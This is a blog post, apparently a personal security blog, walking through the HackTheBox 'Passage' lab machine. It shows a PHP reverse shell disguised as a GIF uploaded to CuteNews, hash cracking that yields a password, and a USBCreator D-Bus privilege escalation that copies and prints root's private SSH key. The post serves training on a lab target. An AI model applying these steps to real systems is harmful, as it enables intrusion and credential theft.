@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/css/medium.css">
+    <link rel="apple-touch-icon" sizes="152x152" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <meta name="theme-color" content="#ffffff">
+    
+    
+    <title>HackTheBox Passage Write Up w/o Metasploit | Ajdin&#39;s blog</title>
+</head>
+<body>
+        <main><div>
+    <a class="nav-item link-fix" href="/">Ajdin&#39;s blog</a>
+    
+    <a class="nav-item link-fix" href="/tags">Tags</a>
+    
+    <a class="nav-item link-fix" href="https://github.com/ajdintrejic">Github</a>
+    
+    <a class="nav-item link-fix" href="/index.xml">RSS</a>
+    
+</div>
+
+<div id="content">
+<br/>
+<h2>HackTheBox Passage Write Up w/o Metasploit</h2>
+
+
+
+<span class="date">23 May 2021</span>
+
+
+
+<hr>
+<p>This is a <strong>medium</strong> box by <strong>ChefByzen</strong>.</p>
+<h2 id="recon">Recon</h2>
+<p>Quick nmap scan for open ports</p>
+<pre><code>$ nmap -p- --min-rate=1000 -T4 passage.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 09:05 EDT
+Nmap scan report for passage.htb (10.10.10.206)
+Host is up (0.072s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 11.28 seconds
+</code></pre><p>I scanned further those ports with nmap&rsquo;s tools.</p>
+<pre><code>$ sudo nmap -p22,80 -sC -sV -O -oA nmap/scan passage.htb
+[sudo] password for kali: 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 09:06 EDT
+Nmap scan report for passage.htb (10.10.10.206)
+Host is up (0.059s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
+|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
+|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Passage News
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), Linux 3.12 (93%), Linux 3.13 (93%), Linux 3.8 - 3.11 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.80 seconds
+</code></pre><p>Let&rsquo;s just take a moment here to take a look what we have here:</p>
+<ul>
+<li>port 22: OpenSSH 7.2p2, unlikely to be exploited as ssh is (mostly) secure</li>
+<li>port 80: http server Apache 2.4.18, our way in as this machine doesn&rsquo;t have any other port open</li>
+</ul>
+<h3 id="port-80">Port 80</h3>
+<p><img src="/htb/passage/1.png" alt=""></p>
+<p>This looks like simple blog site. In the last blog post there is some info about implementing Fail2Ban:</p>
+<blockquote>
+<p><strong>Implemented Fail2Ban</strong> Due to unusally large amounts of traffic,we have implementated Fail2Ban on our website. Let it be known that excessive access to our server will be met with a two minute ban on your IP Address. While we do not wish to lock out our legitimate users, this decision is necessary in order to ensure a safe viewing experience. Please proceed with caution as you browse through our extensive news selection.</p>
+</blockquote>
+<p>So gobuster shouldn&rsquo;t work? I still tried running it and got blocked, so this is implemented as it says. We&rsquo;ll have to dig deeper but this time without tools.</p>
+<p>Also, if we hover over the author &ldquo;admin&rdquo;, we can he his name is Nadav, this will be helpful later as he is probably the privileged user on this machine.</p>
+<p>I saw that a cookie was set by the site.
+<img src="/htb/passage/2.png" alt=""></p>
+<p>So I went back to the comment section and tried to insert a XSS payload into the site&rsquo;s comment section</p>
+<p><img src="/htb/passage/3.png" alt="">
+<img src="/htb/passage/4.png" alt=""></p>
+<p>Even though I was able to inject a payload of any kind the code wasn&rsquo;t being executed.</p>
+<h2 id="cutenews">CuteNews</h2>
+<p>I looked around the source code of the site for some info and I have found that this site was generated with <strong>CuteNews</strong>. I tried to look for version number in the source code and didn&rsquo;t find it initially but I found an <a href="https://medium.com/@musyokaian/cutenews-2-1-2-remote-code-execution-vulnerability-450f29673194">exploit</a> for CuteNews.</p>
+<p>I found the version number on <code>passage.htb/CuteNews/</code>.</p>
+<h3 id="remote-code-execution-exploit">Remote code execution exploit</h3>
+<p>The attack works like this:</p>
+<ol>
+<li>Find CuteNews directory (this instance was on <code>passage.htb/CuteNews/</code>)</li>
+<li>Create an account</li>
+<li>Upload an <strong>evil image</strong> as profile picture which will execute our payload on site</li>
+<li>Reload the page/image and get RCE</li>
+</ol>
+<h4 id="what-does-the-evil-image-do-here">What does the <strong>evil image</strong> do here?</h4>
+<p>It executes our payload. The server thinks the image is an php file and executes code from it.</p>
+<h4 id="how-do-we-craft-this-evil-image">How do we craft this evil image?</h4>
+<ol>
+<li>Create a new file <code>image.gif</code> with a simple php reverse shell.</li>
+<li>Test it for what file it is</li>
+</ol>
+<pre><code>$ file image.php 
+image.php: PHP script, ASCII text
+</code></pre><ol start="3">
+<li>Let&rsquo;s enter some magic bytes at the start so this file gets labeled as a gif. I added in the first line of the file <code>GIF8;</code></li>
+</ol>
+<pre><code>$ file image.php 
+image.php: GIF image data 16188 x 26736
+</code></pre><p>If you don&rsquo;t know what are magic bytes, <a href="https://www.quora.com/What-are-magic-bytes-in-filesystems">click here</a>.</p>
+<p>Now we can upload the image, refresh the page and get a shell as <code>www-data</code>.
+<img src="/htb/passage/5.png" alt=""></p>
+<pre><code>kali@kali:~/htb/passage$ nc -lvnp 9999
+listening on [any] 9999 ...
+connect to [10.10.16.11] from (UNKNOWN) [10.10.10.206] 50230
+whoami
+www-data
+</code></pre><h2 id="getting-pauls-account">Getting Paul&rsquo;s account</h2>
+<p>If a shell breaks we can just reload the image at <code>http://passage.htb/CuteNews/uploads/avatar_&lt;USERNAME&gt;_image.php</code>.</p>
+<p>I ran linenum.sh but I couldn&rsquo;t find anything interesting except a htpasswd file with some hashes, and that we have 2 users on this machine Nadav and Paul.</p>
+<pre><code>[-] htpasswd found - could contain passwords:
+/usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_wrongrelm/.htpasswd
+username:wrongrelm:99cd340e1283c6d0ab34734bd47bdc30
+4105bbb04
+/usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/file/.htpasswd
+username:$apr1$uUMsOjCQ$.BzXClI/B/vZKddgIAJCR.
+/usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/authz_owner/.htpasswd
+username:$apr1$1f5oQUl4$21lLXSN7xQOPtNsj5s4Nk/
+/usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest/.htpasswd
+username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
+/usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_anon/.htpasswd
+username:digest anon:25e4077a9344ceb1a88f2a62c9fb60d8
+05bbb04
+anonymous:digest anon:faa4e5870970cf935bb9674776e6b26a
+/usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_time/.htpasswd
+username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
+</code></pre><p>I tried to crack them but I got this.</p>
+<pre><code>kali@kali:~/htb/passage$ sudo john -format=md5crypt -wordlist=/usr/share/wordlists/rockyou.txt  hashes
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+password         (username)
+foo              (username)
+2g 0:00:00:08 DONE (2020-10-08 11:55) 0.2409g/s 114297p/s 114320c/s 114320C/s foolish*..focus08
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre><p>I knew this was a dead end but I still tried to enter Nadav or Pauls account. I continued to manually enum the whole server.</p>
+<h3 id="cdata-directory">Cdata directory</h3>
+<p>There was a directory <code>/var/www/html/CuteNews/cdata/users</code> which contained some interesting base64 data.</p>
+<p>I started a python3 server from that directory. I could access now all that info.
+<img src="/htb/passage/6.png" alt=""></p>
+<p>Now, I got all these files recusively on my machine with wget</p>
+<pre><code>$ wget -r -nd -np  passage.htb:9999/
+</code></pre><p>I needed to extract all the base64 strings, and decode them.</p>
+<pre><code>$ cat * | cut -d'&lt;' -f 1 | sed '/^[[:space:]]*$/d' | base64 -d 
+</code></pre><ul>
+<li><code>cat *</code>: print all contents of this directory</li>
+<li><code>cut -d'&lt;' -f 1</code>: remove all <!-- raw HTML omitted -->, <!-- raw HTML omitted --> and other tags from the output.</li>
+<li><code>sed '/^[[:space:]]*$/d'</code>: remove all the empty lines</li>
+<li><code>base64 -d</code>: base64 decode the string</li>
+</ul>
+<pre><code>a:1:{s:5:&quot;email&quot;;a:1:{s:16:&quot;paul@passage.htb&quot;;s:10:&quot;paul-coles&quot;;}}a:1:{s:2:&quot;id&quot;;a:1:{i:1598829833;s:6:&quot;egre55&quot;;}}a:1:{s:4:&quot;name&quot;;a:1:{s:1:&quot;a&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1602265122&quot;;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:3:&quot;acl&quot;;s:1:&quot;4&quot;;s:5:&quot;email&quot;;s:14:&quot;a@23afsadf.com&quot;;s:4:&quot;nick&quot;;s:8:&quot;23afsadf&quot;;s:4:&quot;pass&quot;;s:64:&quot;6961adb751df8467726dc84598026059577324e7a0aa3db96bba88d3511d7a5f&quot;;s:4:&quot;more&quot;;s:60:&quot;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&quot;;s:6:&quot;avatar&quot;;s:18:&quot;avatar_a_image.php&quot;;s:6:&quot;e-hide&quot;;s:0:&quot;&quot;;}}}a:1:{s:5:&quot;email&quot;;a:1:{s:15:&quot;egre55@test.com&quot;;s:6:&quot;egre55&quot;;}}a:1:{s:4:&quot;name&quot;;a:1:{s:5:&quot;admin&quot;;a:8:{s:2:&quot;id&quot;;s:10:&quot;1592483047&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;acl&quot;;s:1:&quot;1&quot;;s:5:&quot;email&quot;;s:17:&quot;nadav@passage.htb&quot;;s:4:&quot;pass&quot;;s:64:&quot;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592487988&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;2&quot;;}}}a:1:{s:2:&quot;id&quot;;a:1:{i:1602265319;s:4:&quot;woof&quot;;}}a:1:{s:2:&quot;id&quot;;a:1:{i:1598910896;s:6:&quot;hacker&quot;;}}a:1:{s:5:&quot;email&quot;;a:1:{s:14:&quot;a@23afsadf.com&quot;;s:1:&quot;a&quot;;}}a:1:{s:2:&quot;id&quot;;a:1:{i:1592483281;s:9:&quot;sid-meier&quot;;}}a:1:{s:5:&quot;email&quot;;a:1:{s:17:&quot;nadav@passage.htb&quot;;s:5:&quot;admin&quot;;}}a:1:{s:5:&quot;email&quot;;a:1:{s:15:&quot;kim@example.com&quot;;s:9:&quot;kim-swift&quot;;}}a:1:{s:5:&quot;email&quot;;a:1:{s:20:&quot;hacker@hacker.hacker&quot;;s:6:&quot;hacker&quot;;}}a:1:{s:2:&quot;id&quot;;a:1:{i:1592483236;s:10:&quot;paul-coles&quot;;}}a:1:{s:4:&quot;name&quot;;a:1:{s:9:&quot;sid-meier&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1592483281&quot;;s:4:&quot;name&quot;;s:9:&quot;sid-meier&quot;;s:3:&quot;acl&quot;;s:1:&quot;3&quot;;s:5:&quot;email&quot;;s:15:&quot;sid@example.com&quot;;s:4:&quot;nick&quot;;s:9:&quot;Sid Meier&quot;;s:4:&quot;pass&quot;;s
+[...]
+</code></pre><p>This file is to long to enter it here so I just provided a sample above. I extracted couple of entries, note: second and third row are from Nadav and Paul.</p>
+<pre><code>&quot;s&quot;:2:&quot;id&quot;&quot;;s&quot;:10:&quot;1602265122&quot;&quot;;s&quot;:4:&quot;name&quot;&quot;;s&quot;:1:&quot;a&quot;&quot;;s&quot;:3:&quot;acl&quot;&quot;;s&quot;:1:&quot;4&quot;&quot;;s&quot;:5:&quot;email&quot;&quot;;s&quot;:14:&quot;a@23afsadf.com&quot;&quot;;s&quot;:4:&quot;nick&quot;&quot;;s&quot;:8:&quot;23afsadf&quot;&quot;;s&quot;:4:&quot;pass&quot;&quot;;s&quot;:64:&quot;6961adb751df8467726dc84598026059577324e7a0aa3db96bba88d3511d7a5f&quot;&quot;;s&quot;:4:&quot;more&quot;&quot;;s&quot;:60:&quot;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&quot;&quot;;s&quot;:6:&quot;avatar&quot;&quot;;s&quot;:18:&quot;avatar_a_image.php&quot;&quot;;s&quot;:6:&quot;e-hide&quot;&quot;;s&quot;:0:&quot;&quot;&quot;;&quot;
+&quot;s&quot;:2:&quot;id&quot;&quot;;s&quot;:10:&quot;1592483047&quot;&quot;;s&quot;:4:&quot;name&quot;&quot;;s&quot;:5:&quot;admin&quot;&quot;;s&quot;:3:&quot;acl&quot;&quot;;s&quot;:1:&quot;1&quot;&quot;;s&quot;:5:&quot;email&quot;&quot;;s&quot;:17:&quot;nadav@passage.htb&quot;&quot;;s&quot;:4:&quot;pass&quot;&quot;;s&quot;:64:&quot;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1&quot;&quot;;s&quot;:3:&quot;lts&quot;&quot;;s&quot;:10:&quot;1592487988&quot;&quot;;s&quot;:3:&quot;ban&quot;&quot;;s&quot;:1:&quot;0&quot;&quot;;s&quot;:3:&quot;cnt&quot;&quot;;s&quot;:1:&quot;2&quot;&quot;;&quot;
+&quot;s&quot;:2:&quot;id&quot;&quot;;s&quot;:10:&quot;1592483281&quot;&quot;;s&quot;:4:&quot;name&quot;&quot;;s&quot;:9:&quot;sid-meier&quot;&quot;;s&quot;:3:&quot;acl&quot;&quot;;s&quot;:1:&quot;3&quot;&quot;;s&quot;:5:&quot;email&quot;&quot;;s&quot;:15:&quot;sid@example.com&quot;&quot;;s&quot;:4:&quot;nick&quot;&quot;;s&quot;:9:&quot;Sid Meier&quot;&quot;;s&quot;:4:&quot;pass&quot;&quot;;s&quot;:64:&quot;4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88&quot;&quot;;s&quot;:3:&quot;lts&quot;&quot;;s&quot;:10:&quot;1592485645&quot;&quot;;s&quot;:3:&quot;ban&quot;&quot;;s&quot;:1:&quot;0&quot;&quot;;s&quot;:3:&quot;cnt&quot;&quot;;s&quot;:1:&quot;2&quot;&quot;;&quot;
+&quot;s&quot;:2:&quot;id&quot;&quot;;s&quot;:10:&quot;1592483236&quot;&quot;;s&quot;:4:&quot;name&quot;&quot;;s&quot;:10:&quot;paul-coles&quot;&quot;;s&quot;:3:&quot;acl&quot;&quot;;s&quot;:1:&quot;2&quot;&quot;;s&quot;:5:&quot;email&quot;&quot;;s&quot;:16:&quot;paul@passage.htb&quot;&quot;;s&quot;:4:&quot;nick&quot;&quot;;s&quot;:10:&quot;Paul Coles&quot;&quot;;s&quot;:4:&quot;pass&quot;&quot;;s&quot;:64:&quot;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd&quot;&quot;;s&quot;:3:&quot;lts&quot;&quot;;s&quot;:10:&quot;1592485556&quot;&quot;;s&quot;:3:&quot;ban&quot;&quot;;s&quot;:1:&quot;0&quot;&quot;;s&quot;:3:&quot;cnt&quot;&quot;;s&quot;:1:&quot;2&quot;&quot;;&quot;
+&quot;s&quot;:2:&quot;id&quot;&quot;;s&quot;:10:&quot;1592483309&quot;&quot;;s&quot;:4:&quot;name&quot;&quot;;s&quot;:9:&quot;kim-swift&quot;&quot;;s&quot;:3:&quot;acl&quot;&quot;;s&quot;:1:&quot;3&quot;&quot;;s&quot;:5:&quot;email&quot;&quot;;s&quot;:15:&quot;kim@example.com&quot;&quot;;s&quot;:4:&quot;nick&quot;&quot;;s&quot;:9:&quot;Kim Swift&quot;&quot;;s&quot;:4:&quot;pass&quot;&quot;;s&quot;:64:&quot;f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca&quot;&quot;;s&quot;:3:&quot;lts&quot;&quot;;s&quot;:10:&quot;1592487096&quot;&quot;;s&quot;:3:&quot;ban&quot;&quot;;s&quot;:1:&quot;0&quot;&quot;;s&quot;:3:&quot;cnt&quot;&quot;;s&quot;:1:&quot;3&quot;&quot;;&quot;
+</code></pre><p>I extracted the hashes and dumped it into <a href="https://crackstation.net">Crackstation.net</a>.</p>
+<pre><code>6961adb751df8467726dc84598026059577324e7a0aa3db96bba88d3511d7a5f
+7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
+4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
+e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
+f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
+</code></pre><p><img src="/htb/passage/7.png" alt=""></p>
+<p>These creds are for paul.</p>
+<pre><code>paul@passage.htb:atlanta1
+</code></pre><p>I just used <code>su</code> from <code>www-data</code> and got into Paul&rsquo;s account.</p>
+<h2 id="geting-nadavs-account">Geting Nadav&rsquo;s account</h2>
+<p>I also ran linenum.sh but found nothing. Then I started the manual enumeration again.</p>
+<h3 id="finding-ssh-key">Finding ssh key</h3>
+<p>During manual enumeration I found a ssh key for Nadav. Code below recursively searches all directories below for any word provided. This is how I was able to find the key.</p>
+<pre><code>$ grep  -nriE 'password|admin|sha|hash|config|nadav|creds'
+</code></pre><p>I tried to copy the key and enter from my machine but that didn&rsquo;t work. I also tried to ssh from Paul&rsquo;s account and It worked.</p>
+<h2 id="getting-root">Getting root</h2>
+<p>Linenum didn&rsquo;t find anything, again. I manually inspected the filesystem but nothing. I had no clues left to look around for. I transfered <a href="https://github.com/DominicBreuker/pspy">pspy</a> on the machine.</p>
+<h3 id="spying-on-processes-with-pspy">Spying on processes with pspy</h3>
+<blockquote>
+<p>pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.</p>
+</blockquote>
+<p>I wanted to see all processes with UID=O (aka root), so I just piped the output to grep (note: pspy doesn&rsquo;t close itself, you have to kill it with CTRL+C after some time so you can exit and grep the file).</p>
+<pre><code>$ ./pspy64 &gt; pspy.out
+$ cat pspy.out | grep &quot;UID=0&quot; 
+</code></pre><p>The output had a lot of processes without any name/command. I&rsquo;ve deleted those entries from the log.</p>
+<pre><code>$ cat pspy.out | grep &quot;UID=0&quot; 
+2020/10/10 02:21:53 CMD: UID=0    PID=922    | lightdm --session-child 12 15 
+2020/10/10 02:21:53 CMD: UID=0    PID=858    | /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch 
+2020/10/10 02:21:53 CMD: UID=0    PID=823    | /sbin/agetty --noclear tty1 linux 
+2020/10/10 02:21:53 CMD: UID=0    PID=815    | /usr/sbin/lightdm 
+2020/10/10 02:21:53 CMD: UID=0    PID=790    | /usr/lib/policykit-1/polkitd --no-debug 
+2020/10/10 02:21:53 CMD: UID=0    PID=759    | /usr/sbin/irqbalance --pid=/var/run/irqbalance.pid 
+2020/10/10 02:21:53 CMD: UID=0    PID=707    | /usr/sbin/NetworkManager --no-daemon 
+2020/10/10 02:21:53 CMD: UID=0    PID=7008   | -bash 
+2020/10/10 02:21:53 CMD: UID=0    PID=7006   | sshd: root@pts/21    
+2020/10/10 02:21:53 CMD: UID=0    PID=6964   | sshd: nadav [priv]   
+2020/10/10 02:21:53 CMD: UID=0    PID=665    | /usr/lib/accountsservice/accounts-daemon 
+2020/10/10 02:21:53 CMD: UID=0    PID=653    | /usr/bin/VGAuthService 
+2020/10/10 02:21:53 CMD: UID=0    PID=63529  | sshd: nadav [priv]   
+2020/10/10 02:21:53 CMD: UID=0    PID=63507  | sshd: paul [priv]    
+2020/10/10 02:21:53 CMD: UID=0    PID=622    | /usr/sbin/cron -f 
+2020/10/10 02:21:53 CMD: UID=0    PID=609    | /usr/sbin/acpid 
+2020/10/10 02:21:53 CMD: UID=0    PID=604    | /lib/systemd/systemd-logind 
+2020/10/10 02:21:53 CMD: UID=0    PID=412    | /usr/bin/vmtoolsd 
+2020/10/10 02:21:53 CMD: UID=0    PID=381    | vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid 
+2020/10/10 02:21:53 CMD: UID=0    PID=357    | /lib/systemd/systemd-udevd 
+2020/10/10 02:21:53 CMD: UID=0    PID=3178   | /usr/bin/python3 /usr/share/usb-creator/usb-creator-helper 
+2020/10/10 02:21:53 CMD: UID=0    PID=317    | /lib/systemd/systemd-journald 
+2020/10/10 02:21:53 CMD: UID=0    PID=2160   | /usr/sbin/cups-browsed 
+2020/10/10 02:21:53 CMD: UID=0    PID=2159   | /usr/sbin/cupsd -l 
+2020/10/10 02:21:53 CMD: UID=0    PID=1671   | /usr/bin/python3 /usr/bin/fail2ban-server -s /var/run/fail2ban/fail2ban.sock -p /var/run/fail2ban/fail2ban.pid -x -b 
+2020/10/10 02:21:53 CMD: UID=0    PID=1659   | /usr/sbin/apache2 -k start 
+2020/10/10 02:21:53 CMD: UID=0    PID=1617   | /usr/sbin/sshd -D 
+2020/10/10 02:21:53 CMD: UID=0    PID=1394   | /usr/lib/x86_64-linux-gnu/fwupd/fwupd 
+2020/10/10 02:21:53 CMD: UID=0    PID=1389   | /usr/lib/udisks2/udisksd --no-debug 
+2020/10/10 02:21:53 CMD: UID=0    PID=1197   | /usr/lib/upower/upowerd 
+2020/10/10 02:21:53 CMD: UID=0    PID=1      | /sbin/init auto noprompt 
+</code></pre><p>I quickly ruled out lightdm, xorg, apache, cron, bash, sshd, systemd and init processes. This left me with much less things to look at.</p>
+<pre><code>2020/10/10 02:21:53 CMD: UID=0    PID=823    | /sbin/agetty --noclear tty1 linux 
+2020/10/10 02:21:53 CMD: UID=0    PID=790    | /usr/lib/policykit-1/polkitd --no-debug 
+2020/10/10 02:21:53 CMD: UID=0    PID=759    | /usr/sbin/irqbalance --pid=/var/run/irqbalance.pid 
+2020/10/10 02:21:53 CMD: UID=0    PID=707    | /usr/sbin/NetworkManager --no-daemon 
+2020/10/10 02:21:53 CMD: UID=0    PID=665    | /usr/lib/accountsservice/accounts-daemon 
+2020/10/10 02:21:53 CMD: UID=0    PID=653    | /usr/bin/VGAuthService 
+2020/10/10 02:21:53 CMD: UID=0    PID=609    | /usr/sbin/acpid 
+2020/10/10 02:21:53 CMD: UID=0    PID=412    | /usr/bin/vmtoolsd 
+2020/10/10 02:21:53 CMD: UID=0    PID=381    | vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid 
+2020/10/10 02:21:53 CMD: UID=0    PID=3178   | /usr/bin/python3 /usr/share/usb-creator/usb-creator-helper 
+2020/10/10 02:21:53 CMD: UID=0    PID=2160   | /usr/sbin/cups-browsed 
+2020/10/10 02:21:53 CMD: UID=0    PID=2159   | /usr/sbin/cupsd -l 
+2020/10/10 02:21:53 CMD: UID=0    PID=1671   | /usr/bin/python3 /usr/bin/fail2ban-server -s /var/run/fail2ban/fail2ban.sock -p /var/run/fail2ban/fail2ban.pid -x -b 
+2020/10/10 02:21:53 CMD: UID=0    PID=1394   | /usr/lib/x86_64-linux-gnu/fwupd/fwupd 
+2020/10/10 02:21:53 CMD: UID=0    PID=1389   | /usr/lib/udisks2/udisksd --no-debug 
+2020/10/10 02:21:53 CMD: UID=0    PID=1197   | /usr/lib/upower/upowerd 
+</code></pre><p>Now, something here should be exploitable, and It was. I thought it was the fail2ban python file but upon some research, that wasn&rsquo;t true.</p>
+<p>I had a hunch for that fail2ban as it was ran with python but there another file which was ran from python.</p>
+<pre><code>2020/10/10 02:21:53 CMD: UID=0    PID=3178   | /usr/bin/python3 /usr/share/usb-creator/usb-creator-helper 
+</code></pre><h3 id="usb-creator-exploit">USB Creator exploit</h3>
+<p>I googled around for an exploit and found a helpful blog post <a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">here</a>.</p>
+<blockquote>
+<p>A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root – without supplying a password. This trivially leads to elevated privileges, for instance, by overwriting the shadow file and setting a password for root. The issue was resolved in June when Ubuntu patched the relevant packages in response to a vulnerability disclosure from Unit 42.</p>
+</blockquote>
+<p>The exploit pretty much enables us to use dd command to copy around files as root. So I just grabbed the ssh keys and that&rsquo;s it.</p>
+<pre><code>$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/c/id_rsa true
+()
+$ cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAth1mFSVw6Erdhv7qc+Z5KWQMPtwTsT9630uzpq5fBx/KKzqZ
+B7G3ej77MN35+ULlwMcpoumayWK4yZ/AiJBm6FEVBGSwjSMpOGcNXTL1TClGWbdE
++WNBT+30n0XJzi/JPhpoWhXM4OqYLCysX+/b0psF0jYLWy0MjqCjCl/muQtD6f2e
+jc2JY1KMMIppoq5DwB/jJxq1+eooLMWVAo9MDNDmxDiw+uWRUe8nj9qFK2LRKfG6
+U6wnyQ10ANXIdRIY0bzzhQYTMyH7o5/sjddrRGMDZFmOq6wHYN5sUU+sZDYD18Yg
+ezdTw/BBiDMEPzZuCUlW57U+eX3uY+/Iffl+AwIDAQABAoIBACFJkF4vIMsk3AcP
+0zTqHJ1nLyHSQjs0ujXUdXrzBmWb9u0d4djZMAtFNc7B1C4ufyZUgRTJFETZKaOY
+8q1Dj7vJDklmSisSETfBBl1RsiqApN5DNHVNIiQE/6CZNgDdFTCnzQkiUPePic8R
+P1St2AVP1qmMvVimDFSJoiOEUfzidepXEEUQrByNmOJDtewMSm4aGz60ced2XCBr
+GTt/wyo0y5ygRJkUcC+/o4/r2DQdrjCbeuyzAzzhFKQQx6HN5svzpi0jOWC0cB0W
+GmAp5Q7fIFhuGyrxShs/BEuQP7q7Uti68iwEh2EZSlaMcBFEJvirWtIO7U3yIHYI
+HnNlLvECgYEA7tpebu84sTuCarHwASAhstiCR5LMquX/tZtHi52qKKmYzG6wCCMg
+S/go8DO8AX5mldkegD7KBmTeMNPKp8zuE8s+vpErCBH+4hOq6U1TwZvDQ2XY9HBz
+aHz7vG5L8E7tYpJ64Tt8e0DcnQQtW8EqFIydipO0eLdxkIGykjWuYGsCgYEAwzBM
+UZMmOcWvUULWf65VSoXE270AWP9Z/XuamG/hNpREDZEYvHmhucZBf1MSGGU/B7MC
+YXbIs1sS6ehDcib8aCVdOqRIqhCqCd1xVnbE0T4F2s1yZkct09Bki6EuXPDo2vhy
+/6v6oP+yT5z854Vfq0FWxmDUssMbjXkVLKIZ3skCgYAYvxsllzdidW3vq/vXwgJ7
+yx7EV5tI4Yd6w1nIR0+H4vpnw9gNH8aK2G01ZcbGyNfMErCsTNUVkIHMwUSv2fWY
+q2gWymeQ8Hxd4/fDMDXLS14Rr42o1bW/T6OtRCgt/59spQyCJW2iP3gb9IDWjs7T
+TjZMUz1RfIARnr5nk5Q7fQKBgGESVxJGvT8EGoGuXODZAZ/zUQj7QP4B2G5hF2xy
+T64GJKYeoA+z6gNrHs3EsX4idCtPEoMIQR45z/k2Qry1uNfOpUPxyhWR/g6z65bV
+sGJjlyPPAvLsuVTbEfYDLfyY7yVfZEnU7Os+3x4K9BfsU7zm3NIB/CX/NGeybR5q
+a7VJAoGANui4oMa/9x8FSoe6EPsqbUcbJCmSGPqS8i/WZpaSzn6nW+636uCgB+EP
+WOtSvOSRRbx69j+w0s097249fX6eYyIJy+L1LevF092ExQdoc19JTTKJZiWwlk3j
+MkLnfTuKj2nvqQQ2fq+tIYEhY6dcSRLDQkYMCg817zynfP0I69c=
+-----END RSA PRIVATE KEY-----
